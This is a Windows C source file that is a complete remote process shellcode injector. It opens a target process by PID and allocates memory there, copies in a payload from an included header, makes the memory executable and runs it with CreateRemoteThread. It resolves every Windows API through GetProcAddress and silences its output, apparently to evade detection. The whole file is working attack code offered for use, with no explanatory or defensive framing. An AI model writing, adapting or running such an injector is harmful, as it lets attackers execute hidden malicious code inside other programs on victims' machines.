#include <stdio.h>
#include <windows.h>
#include <TlHelp32.h>
#include "payload.h"

int main( int argc, char* argv[] )
{
    if( argc < 2 )
    {
        return 1;
    }

    HANDLE process_snapshot;
    HANDLE target_process = NULL;
    PROCESSENTRY32 current_process;
    DWORD process_id = atoi( argv[1] );

    //
    // ENUMERATE RUNNING PROCESSES TO ENSURE PID IS VALID
    //
    HMODULE kernel32_dll_handle = LoadLibraryA( "KERNEL32.DLL" );
    
    if( NULL == kernel32_dll_handle )
    {
        // printf( "Could not load kernel32.dll!\n" );
        return 1;
    }
    
    HANDLE( WINAPI * _CreateToolhelp32Snapshot )
    (
        DWORD dwFlags,
        DWORD th32ProcessID        
    );

    _CreateToolhelp32Snapshot = (HANDLE (WINAPI *)
    (
        DWORD dwFlags,
        DWORD th32ProcessID     
    )) GetProcAddress( kernel32_dll_handle, "CreateToolhelp32Snapshot" );

    if( NULL == _CreateToolhelp32Snapshot )
    {
        // printf( "Could not resolve CreateToolhelp32Snapshot!\n" );
        return 1;
    }

    process_snapshot = _CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );

    if( NULL == process_snapshot )
    {
        return 1;
    }

    current_process.dwSize = sizeof( PROCESSENTRY32 );
    
    BOOL( WINAPI * _Process32First)
    (
        HANDLE           hSnapshot,
        LPPROCESSENTRY32 lppe   
    );

    _Process32First = ( BOOL (WINAPI *)
    (
        HANDLE           hSnapshot,
        LPPROCESSENTRY32 lppe     
    )) GetProcAddress( kernel32_dll_handle, "Process32First" );

    if( NULL == _Process32First )
    {
        // printf( "Could not resolve Process32First!\n" );
        return 1;
    }
    
    _Process32First( process_snapshot, &current_process );

    BOOL( WINAPI * _Process32Next)
    (
        HANDLE           hSnapshot,
        LPPROCESSENTRY32 lppe 
    );

    _Process32Next = ( BOOL (WINAPI *)
    (
        HANDLE           hSnapshot,
        LPPROCESSENTRY32 lppe    
    )) GetProcAddress( kernel32_dll_handle, "Process32Next" );

    if( NULL == _Process32Next )
    {
        // printf( "Could not resolve Process32Next!\n" );
        return 1;
    }

    do
    {   
        // printf( "process id = %d\n", current_process.th32ProcessID );
        if( process_id == current_process.th32ProcessID )
        {
            HANDLE( WINAPI * _OpenProcess )
            (
                DWORD dwDesiredAccess,
                BOOL  bInheritHandle,
                DWORD dwProcessId            
            );

            _OpenProcess = ( HANDLE (WINAPI *)
            (
                DWORD dwDesiredAccess,
                BOOL  bInheritHandle,
                DWORD dwProcessId             
            )) GetProcAddress( kernel32_dll_handle, "OpenProcess" );

            if( NULL == _OpenProcess )
            {
                // printf( "Could not resolve OpenProcess!\n" );
                return 1;
            }

            target_process = _OpenProcess( PROCESS_ALL_ACCESS, TRUE, current_process.th32ProcessID );
            break;
        }
    }

    while( _Process32Next(process_snapshot, &current_process) );

    CloseHandle( process_snapshot );

    if( NULL == target_process )
    {
        return 1;
    }

    //
    // ALLOCATE MEMORY IN TARGET PROCESS
    //
    size_t payload_size = sizeof( payload );
    LPVOID target_process_allocated_memory = NULL;
    
    LPVOID( WINAPI * _VirtualAllocEx )
    (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect    
    );

    _VirtualAllocEx = ( LPVOID( WINAPI *) 
    (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flAllocationType,
        DWORD  flProtect    
    )) GetProcAddress( kernel32_dll_handle, "VirtualAllocEx" );

    if( NULL == _VirtualAllocEx )
    {
        // printf( "Could not resolve VirtualAllocEx!\n" );
        return 1;
    }

    target_process_allocated_memory = _VirtualAllocEx( target_process, NULL, payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );

    if( NULL == target_process_allocated_memory )
    {
        // printf( "[!] Could not allocate memory!\n" );
        return 1;
    }

    // printf( "[+] Successfully allocated memory!\n" );

    //
    // WRITE TO ALLOCATED MEMORY
    //
    BOOL return_check = FALSE;

    BOOL( WINAPI * _WriteProcessMemory )
    (
        HANDLE  hProcess,
        LPVOID  lpBaseAddress,
        LPCVOID lpBuffer,
        SIZE_T  nSize,
        SIZE_T  *lpNumberOfBytesWritten    
    );

    _WriteProcessMemory = ( BOOL(WINAPI *)
    (
        HANDLE  hProcess,
        LPVOID  lpBaseAddress,
        LPCVOID lpBuffer,
        SIZE_T  nSize,
        SIZE_T  *lpNumberOfBytesWritten     
    )) GetProcAddress( kernel32_dll_handle, "WriteProcessMemory" );

    if( NULL == _WriteProcessMemory )
    {
        // printf( "Could not resolve WriteProcessMemory!\n" );
        return 1;
    }

    return_check = _WriteProcessMemory( target_process, target_process_allocated_memory, payload, payload_size, NULL );

    if( FALSE == return_check )
    {
        // printf( "[+] WriteProcessMemory returned false!\n" );
        return 1;
    }

    //
    // UPDATE PERMISSIONS TO ALLOW EXECUTION
    //
    DWORD old_protect = NULL;

    BOOL( WINAPI * _VirtualProtectEx )
    (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect
    );

    _VirtualProtectEx = ( BOOL(WINAPI *)
    (
        HANDLE hProcess,
        LPVOID lpAddress,
        SIZE_T dwSize,
        DWORD  flNewProtect,
        PDWORD lpflOldProtect   
    )) GetProcAddress( kernel32_dll_handle, "VirtualProtectEx" );

    if( NULL == _VirtualProtectEx )
    {
        // printf( "Could not resolve VirtualProtectEx!\n" );
        return 0;
    }

    return_check = _VirtualProtectEx( target_process, target_process_allocated_memory, payload_size, PAGE_EXECUTE_READWRITE, &old_protect );

    if( FALSE == return_check )
    {
        // printf( "[!] VirtualProtectEx() returned false! Error code: %d\n", GetLastError() );
        return 1;
    }

    //
    // EXECUTED SHELLCODE IN ALLOCATED MEMORY
    //
    HANDLE handle_remote_thread = NULL;

    HANDLE( WINAPI * _CreateRemoteThread )
    (
        HANDLE                 hProcess,
        LPSECURITY_ATTRIBUTES  lpThreadAttributes,
        SIZE_T                 dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID                 lpParameter,
        DWORD                  dwCreationFlags,
        LPDWORD                lpThreadId   
    );

    _CreateRemoteThread = ( HANDLE(WINAPI *)
    (
        HANDLE                 hProcess,
        LPSECURITY_ATTRIBUTES  lpThreadAttributes,
        SIZE_T                 dwStackSize,
        LPTHREAD_START_ROUTINE lpStartAddress,
        LPVOID                 lpParameter,
        DWORD                  dwCreationFlags,
        LPDWORD                lpThreadId    
    )) GetProcAddress( kernel32_dll_handle, "CreateRemoteThread" );

    if( NULL == _CreateRemoteThread )
    {
        // printf( "Could not resolve CreateRemoteThread!\n" );
        return 1;
    }

    handle_remote_thread = _CreateRemoteThread( target_process, NULL, 0, target_process_allocated_memory, NULL, 0, NULL );

    if( NULL == handle_remote_thread )
    {
        // printf( "[!] CreateRemoteThread() failed!\n" );
        return 1;
    }    

    return 0;
}